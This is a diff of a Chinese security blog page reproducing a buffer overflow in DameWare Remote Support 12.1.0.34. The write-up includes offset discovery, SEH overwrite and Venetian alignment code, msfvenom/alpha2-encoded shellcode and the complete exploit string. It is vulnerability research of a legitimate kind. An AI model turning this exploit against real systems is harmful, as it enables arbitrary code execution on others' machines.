@@ -19,15 +19,15 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
-  <meta name="description" content="0x01 漏洞描述DameWare是windows上一款著名的远控软件，其在2019年7月刚被曝出某处存在缓冲区溢出攻击，并可执行任意代码，影响版本V.12.1.0.34，这边做一下复现，环境是win 7(32位)。 0x02 漏洞分析根据作者POC，在Tools-&gt;Computer Comments-&gt;Description功能下的ComputerName文本框内输入超长字符串会导致程序内存溢出">
+  <meta name="description" content="0x01 漏洞描述DameWare是windows上一款著名的远控软件，其在2019年7月刚被曝出某处存在缓冲区溢出攻击，并可执行任意代码，影响版本V.12.1.0.34，这边做一下复现，环境是win 7(32位)。 0x02 漏洞分析根据作者POC，在Tools-&gt;Computer Comments-&gt;Description功能下的ComputerName文本框内输入超长字符串会导致">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DameWare Remote Support缓冲区溢出漏洞复现">
 <meta property="og:url" content="https://driverxdw.github.io/2019/10/29/DameWare-Remote-Support%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="in0va&#39;S Blog  JustLearnM0re">
-<meta property="og:description" content="0x01 漏洞描述DameWare是windows上一款著名的远控软件，其在2019年7月刚被曝出某处存在缓冲区溢出攻击，并可执行任意代码，影响版本V.12.1.0.34，这边做一下复现，环境是win 7(32位)。 0x02 漏洞分析根据作者POC，在Tools-&gt;Computer Comments-&gt;Description功能下的ComputerName文本框内输入超长字符串会导致程序内存溢出">
+<meta property="og:description" content="0x01 漏洞描述DameWare是windows上一款著名的远控软件，其在2019年7月刚被曝出某处存在缓冲区溢出攻击，并可执行任意代码，影响版本V.12.1.0.34，这边做一下复现，环境是win 7(32位)。 0x02 漏洞分析根据作者POC，在Tools-&gt;Computer Comments-&gt;Description功能下的ComputerName文本框内输入超长字符串会导致">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://driverxdw.github.io/2019/10/29/DameWare-Remote-Support%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
 <meta property="og:image" content="https://driverxdw.github.io/2019/10/29/DameWare-Remote-Support%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png">
@@ -43,7 +43,7 @@
 <meta property="og:image" content="https://driverxdw.github.io/2019/10/29/DameWare-Remote-Support%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png">
 <meta property="article:published_time" content="2019-10-29T15:55:57.000Z">
 <meta property="article:modified_time" content="2020-07-06T02:08:50.284Z">
-<meta property="article:author" content="xdw">
+<meta property="article:author" content="XDW">
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="漏洞">
 <meta name="twitter:card" content="summary">
@@ -157,29 +157,9 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
 
   </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
-
-  </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -217,7 +197,9 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xdw</p>
+    <img class="site-author-image" itemprop="image" alt="XDW"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">XDW</p>
   <div class="site-description" itemprop="description">一枚很菜但是仍在学习的二进制菜逼</div>
 </div>
 <div class="site-state-wrap animated">
@@ -231,7 +213,6 @@
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-          
         <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
@@ -245,6 +226,16 @@
 </div>
 
 
+  <div class="links-of-blogroll animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ixuchao.cn/" title="https:&#x2F;&#x2F;blog.ixuchao.cn&#x2F;" rel="noopener" target="_blank">Archerx's Blog</a>
+        </li>
+    </ul>
+  </div>
 
       </section>
     </div>
@@ -277,8 +268,8 @@
     <link itemprop="mainEntityOfPage" href="https://driverxdw.github.io/2019/10/29/DameWare-Remote-Support%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xdw">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="XDW">
       <meta itemprop="description" content="一枚很菜但是仍在学习的二进制菜逼">
     </span>
 
@@ -312,6 +303,13 @@
       </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -321,25 +319,25 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <html><head></head><body><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>DameWare是windows上一款著名的远控软件，其在2019年7月刚被曝出某处存在缓冲区溢出攻击，并可执行任意代码，影响版本V.12.1.0.34，这边做一下复现，环境是win 7(32位)。</p>
-<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>根据作者POC，在Tools->Computer Comments->Description功能下的ComputerName文本框内输入超长字符串会导致程序内存溢出崩溃，贴下图</p>
+        <h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>DameWare是windows上一款著名的远控软件，其在2019年7月刚被曝出某处存在缓冲区溢出攻击，并可执行任意代码，影响版本V.12.1.0.34，这边做一下复现，环境是win 7(32位)。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>根据作者POC，在Tools-&gt;Computer Comments-&gt;Description功能下的ComputerName文本框内输入超长字符串会导致程序内存溢出崩溃，贴下图</p>
 <a id="more"></a>
 
 <p>输入5000个A：</p>
-<p><img src="./1.png" alt></p>
+<p><img src="./1.png" alt=""></p>
 <p>程序崩溃：</p>
-<p><img src="./2.png" alt></p>
+<p><img src="./2.png" alt=""></p>
 <p>载入OD分析一下，根据栈回溯找到关键调用函数0x4CADB8，Shift+F9后在ComputerName文本框内输入5000个A，程序断在0x4CADB8处，F8单步步过，发现SEH被覆写为0x00410041</p>
-<p><img src="./3.png" alt></p>
+<p><img src="./3.png" alt=""></p>
 <p>按理说SEH应该会被覆写成0x41414141的，但这边确是0x00410041，根据经验，应该是程序把用户输入的ASCII转换成了UNICODE。</p>
 <p>为了能够编写exp，这边需要计算下用户输入的栈空间到SEH的偏移量，</p>
-<figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l <span class="hljs-number">5000</span> #msf工具生成<span class="hljs-number">5000</span>个字符</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l <span class="number">5000</span> #msf工具生成<span class="number">5000</span>个字符</span><br></pre></td></tr></table></figure>
 
 <p>输入ComputerName文本框后程序断下，单步后发现SEH被更改，堆栈跟随去观察具体覆盖情况</p>
-<p><img src="./10.png" alt></p>
-<p><img src="./11.png" alt></p>
+<p><img src="./10.png" alt=""></p>
+<p><img src="./11.png" alt=""></p>
 <p>查找偏移:</p>
-<figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q <span class="hljs-string">"37694136"</span> -l <span class="hljs-number">5000</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q <span class="string">"37694136"</span> -l <span class="number">5000</span></span><br></pre></td></tr></table></figure>
 
 <p>发现偏移在260个字节处。</p>
 <h2 id="0x03-漏洞脚本编写"><a href="#0x03-漏洞脚本编写" class="headerlink" title="0x03 漏洞脚本编写"></a>0x03 漏洞脚本编写</h2><p>确定是用户输入转unicode以及溢出偏移量以后就可以编写exp了，主要结构是padding + nseh + seh + shellcode</p>
@@ -350,42 +348,42 @@
 <li>将NSEH的指针弹入EIP，执行shellcode</li>
 </ul>
 <p>首先在 Immunity debugger 下用mona插件找一个合适的<code>POP-POP-RET</code>地址</p>
-<p><img src="./12.png" alt></p>
+<p><img src="./12.png" alt=""></p>
 <p>由于程序会将用户输入的ascii转为unicode，这边无法找到合适的输入转化为unicode来构造jmp short跳转到shellcode，所以这边使用一种叫做ventian shellcode来进行填充，将shellcode的内存地址放到eax寄存器中，然后push eax到栈上，最后ret eax到eip，通过这种方式去执行shellcode代码。</p>
-<figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">junk1 = <span class="hljs-string">"A"</span> * 260</span><br><span class="line">nseh  = <span class="hljs-string">"\x61\x43"</span> #popad</span><br><span class="line"><span class="hljs-comment"># 0x007a0021 : pop esi # pop edi # ret</span></span><br><span class="line">seh   = <span class="hljs-string">"\x21\x7a"</span> #unicode将转换为0x007a0021</span><br><span class="line">junk2 = <span class="hljs-string">"\x41"</span> * 1348 </span><br><span class="line"><span class="hljs-comment"># 将真正的shellcode放在eax中，之后压栈，最后ret(eax)</span></span><br><span class="line"><span class="hljs-comment"># 20 bytes</span></span><br><span class="line">align  = <span class="hljs-string">""</span></span><br><span class="line">align += <span class="hljs-string">"\x43"</span> * 10                # Padding</span><br><span class="line">align += <span class="hljs-string">"\x58"</span>                     # POP EAX</span><br><span class="line">align += <span class="hljs-string">"\x73"</span>                     # Venetian padding</span><br><span class="line"><span class="hljs-comment"># 0012F590   83C0 50                # ADD EAX,50</span></span><br><span class="line">align += u<span class="hljs-string">"\uC083"</span> + <span class="hljs-string">"\x50"</span>         # <span class="hljs-builtin-name">ADD</span> EAX, 50</span><br><span class="line">align += <span class="hljs-string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align += <span class="hljs-string">"\x50"</span>                     # PUSH EAX</span><br><span class="line">align += <span class="hljs-string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align +=  u<span class="hljs-string">'\uC3C3'</span>                 # RETN</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">junk1 = <span class="string">"A"</span> * 260</span><br><span class="line">nseh  = <span class="string">"\x61\x43"</span> #popad</span><br><span class="line"><span class="comment"># 0x007a0021 : pop esi # pop edi # ret</span></span><br><span class="line">seh   = <span class="string">"\x21\x7a"</span> #unicode将转换为0x007a0021</span><br><span class="line">junk2 = <span class="string">"\x41"</span> * 1348 </span><br><span class="line"><span class="comment"># 将真正的shellcode放在eax中，之后压栈，最后ret(eax)</span></span><br><span class="line"><span class="comment"># 20 bytes</span></span><br><span class="line">align  = <span class="string">""</span></span><br><span class="line">align += <span class="string">"\x43"</span> * 10                # Padding</span><br><span class="line">align += <span class="string">"\x58"</span>                     # POP EAX</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line"><span class="comment"># 0012F590   83C0 50                # ADD EAX,50</span></span><br><span class="line">align += u<span class="string">"\uC083"</span> + <span class="string">"\x50"</span>         # <span class="builtin-name">ADD</span> EAX, 50</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align += <span class="string">"\x50"</span>                     # PUSH EAX</span><br><span class="line">align += <span class="string">"\x73"</span>                     # Venetian padding</span><br><span class="line">align +=  u<span class="string">'\uC3C3'</span>                 # RETN</span><br></pre></td></tr></table></figure>
 
 
 
 <p>简单来说其实就是找一个接近布置shellcode的缓冲区地址的寄存器，并通过增加/减小它的值来使它指向shellcode，最终通过push reg，ret的方式来跳转到shellcode执行，这边最初的eax距shellcode 50字节的大小，所以需要构造来add eax 50。</p>
 <p>之后生成shellcode，这边选用msf来生成，并用一个叫alpha2的工具来将ascii编码的shellcode转为unicode后仍可用的字符串</p>
-<figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec <span class="hljs-attribute">CMD</span>=calc -f<span class="hljs-built_in"> raw </span>> shellcode.raw</span><br><span class="line">./alpha2 eax --unicode --uppercase < shellcode.raw</span><br><span class="line"><span class="hljs-comment">##alpha2生成的shellcode是变化的，生成的shellcode无法成功执行时可以多换几个shellcode试试</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec <span class="attribute">CMD</span>=calc -f<span class="built_in"> raw </span>&gt; shellcode.raw</span><br><span class="line">./alpha2 eax --unicode --uppercase &lt; shellcode.raw</span><br><span class="line"><span class="comment">##alpha2生成的shellcode是变化的，生成的shellcode无法成功执行时可以多换几个shellcode试试</span></span><br></pre></td></tr></table></figure>
 
 <p>这边alpha2不自带，需要自己编译，贴下源码地址 <a href="https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/alpha2.c" target="_blank" rel="noopener">https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/alpha2.c</a> </p>
 <p>生成shellcode如下:</p>
-<figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">shellcode</span>=<span class="hljs-string">"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A"</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">shellcode</span>=<span class="string">"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXTBKPKPM0C03YK5P1Y01T4KR0004K22LLTKPRMDTKD2NHLO87PJO601KOFLOLQQCLM2NLMPWQXOLMKQWWK2ZRR2PWTKB2LPDKPJOLDKPLN1RXISOXKQXQPQTKPYMPKQXSTK19LX9SNZPITKOD4KKQYFNQKOVLY1XOLMM1WWOH9P45JVKSSMJXOKSMO43EK4PX4KR8MTM1YC1V4KLL0K4K28MLKQ8STKKT4KKQJ0SYOTMTO41K1KQQR9PZPQKOIP1O1OPZTKN2ZKTMQMBJM1TME5X2KPKPM0PPQXNQTKROSWKOXUGKJP85G2PVQX5VV57MUMKO9EOLKVSLKZU0KKYPT5KUWKOWMCRRRO2JKP0SKO8US31QRLS3M0A"</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="0x04-攻击演示"><a href="#0x04-攻击演示" class="headerlink" title="0x04 攻击演示"></a>0x04 攻击演示</h2><p>将shellcode代入之前编写好的padding+nseh+seh+shellcode+padding的模板，得到攻击代码如下:</p>
-<figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaC!zCCCCCCCCCCXs삃PsPs쏃CCCCCCCCCCCCCCCCCCPPYAIAIAIAIAQATAXAZAPA<span class="hljs-number">3</span>QADAZABARALAYAIAQAIAQAPA<span class="hljs-number">5</span>AAAPAZ<span class="hljs-number">1</span>AI<span class="hljs-number">1</span>AIAIAJ<span class="hljs-number">11</span>AIAIAXA<span class="hljs-number">58</span>AAPAZABABQI<span class="hljs-number">1</span>AIQIAIQI<span class="hljs-number">1111</span>AIAJQI<span class="hljs-number">1</span>AYAZBABABABAB<span class="hljs-number">30</span>APB<span class="hljs-number">944</span>JBKLIXTBKPKP<span class="hljs-name">M0</span>C<span class="hljs-number">03</span>YK<span class="hljs-number">5</span>P<span class="hljs-number">1</span>Y<span class="hljs-number">01</span>T<span class="hljs-number">4</span>KR<span class="hljs-number">0004</span>K<span class="hljs-number">22</span>LLTKPRMDTKD<span class="hljs-number">2</span><span class="hljs-symbol">NHLO87</span>PJ<span class="hljs-meta">O601</span>KOFLOLQQCL<span class="hljs-name">M2</span><span class="hljs-symbol">NLMPWQXOLMKQWWK2</span>ZRR<span class="hljs-number">2</span>PWTKB<span class="hljs-number">2</span>LPDKPJOLDKPL<span class="hljs-symbol">N1</span>RXISOXKQXQPQTKPYMPKQXSTK<span class="hljs-number">19</span>LX<span class="hljs-number">9</span>S<span class="hljs-symbol">NZPITKOD4</span>KKQYF<span class="hljs-symbol">NQKOVLY1</span>XOLM<span class="hljs-name">M1</span>WWOH<span class="hljs-number">9</span>P<span class="hljs-number">45</span>JVKSSMJXOKSM<span class="hljs-meta">O43</span>EK<span class="hljs-number">4</span>PX<span class="hljs-number">4</span>KR<span class="hljs-number">8</span>MT<span class="hljs-name">M1</span>YC<span class="hljs-number">1</span>V<span class="hljs-number">4</span>KLL<span class="hljs-number">0</span>K<span class="hljs-number">4</span>K<span class="hljs-number">28</span>MLKQ<span class="hljs-number">8</span>STKKT<span class="hljs-number">4</span>KKQJ<span class="hljs-number">0</span>SYOTMT<span class="hljs-meta">O41</span>K<span class="hljs-number">1</span>KQQR<span class="hljs-number">9</span>PZPQKOIP<span class="hljs-number">1</span><span class="hljs-meta">O1</span>OPZTK<span class="hljs-symbol">N2</span>ZKTMQMBJ<span class="hljs-name">M1</span>TME<span class="hljs-number">5</span>X<span class="hljs-number">2</span>KPKP<span class="hljs-name">M0</span>PPQX<span class="hljs-symbol">NQTKROSWKOXUGKJP85</span><span class="hljs-name">G2</span>PVQX<span class="hljs-number">5</span>VV<span class="hljs-number">57</span>MUMK<span class="hljs-meta">O9</span>EOLK<span class="hljs-attr">VSLKZU0</span>KKYPT<span class="hljs-number">5</span>KUWKOWMCRRR<span class="hljs-meta">O2</span>JKP<span class="hljs-number">0</span>SK<span class="hljs-meta">O8</span>US<span class="hljs-number">31</span>QRLS<span class="hljs-number">3</span><span class="hljs-name">M0</span>ADDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaC!zCCCCCCCCCCXs삃PsPs쏃CCCCCCCCCCCCCCCCCCPPYAIAIAIAIAQATAXAZAPA<span class="number">3</span>QADAZABARALAYAIAQAIAQAPA<span class="number">5</span>AAAPAZ<span class="number">1</span>AI<span class="number">1</span>AIAIAJ<span class="number">11</span>AIAIAXA<span class="number">58</span>AAPAZABABQI<span class="number">1</span>AIQIAIQI<span class="number">1111</span>AIAJQI<span class="number">1</span>AYAZBABABABAB<span class="number">30</span>APB<span class="number">944</span>JBKLIXTBKPKP<span class="name">M0</span>C<span class="number">03</span>YK<span class="number">5</span>P<span class="number">1</span>Y<span class="number">01</span>T<span class="number">4</span>KR<span class="number">0004</span>K<span class="number">22</span>LLTKPRMDTKD<span class="number">2</span><span class="symbol">NHLO87</span>PJ<span class="meta">O601</span>KOFLOLQQCL<span class="name">M2</span><span class="symbol">NLMPWQXOLMKQWWK2</span>ZRR<span class="number">2</span>PWTKB<span class="number">2</span>LPDKPJOLDKPL<span class="symbol">N1</span>RXISOXKQXQPQTKPYMPKQXSTK<span class="number">19</span>LX<span class="number">9</span>S<span class="symbol">NZPITKOD4</span>KKQYF<span class="symbol">NQKOVLY1</span>XOLM<span class="name">M1</span>WWOH<span class="number">9</span>P<span class="number">45</span>JVKSSMJXOKSM<span class="meta">O43</span>EK<span class="number">4</span>PX<span class="number">4</span>KR<span class="number">8</span>MT<span class="name">M1</span>YC<span class="number">1</span>V<span class="number">4</span>KLL<span class="number">0</span>K<span class="number">4</span>K<span class="number">28</span>MLKQ<span class="number">8</span>STKKT<span class="number">4</span>KKQJ<span class="number">0</span>SYOTMT<span class="meta">O41</span>K<span class="number">1</span>KQQR<span class="number">9</span>PZPQKOIP<span class="number">1</span><span class="meta">O1</span>OPZTK<span class="symbol">N2</span>ZKTMQMBJ<span class="name">M1</span>TME<span class="number">5</span>X<span class="number">2</span>KPKP<span class="name">M0</span>PPQX<span class="symbol">NQTKROSWKOXUGKJP85</span><span class="name">G2</span>PVQX<span class="number">5</span>VV<span class="number">57</span>MUMK<span class="meta">O9</span>EOLK<span class="attr">VSLKZU0</span>KKYPT<span class="number">5</span>KUWKOWMCRRR<span class="meta">O2</span>JKP<span class="number">0</span>SK<span class="meta">O8</span>US<span class="number">31</span>QRLS<span class="number">3</span><span class="name">M0</span>ADDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br></pre></td></tr></table></figure>
 
 <p>提前在<code>0x007a0021</code>处下好断点，进行输入后发现断在了<code>0x007a0021</code>处，单步</p>
-<p><img src="./4.png" alt></p>
+<p><img src="./4.png" alt=""></p>
 <p>ret返回到nseh指向的缓冲代码处</p>
-<p><img src="./5.png" alt></p>
-<figure class="highlight x86asm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span> <span class="hljs-number">0x50</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">ret</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="./5.png" alt=""></p>
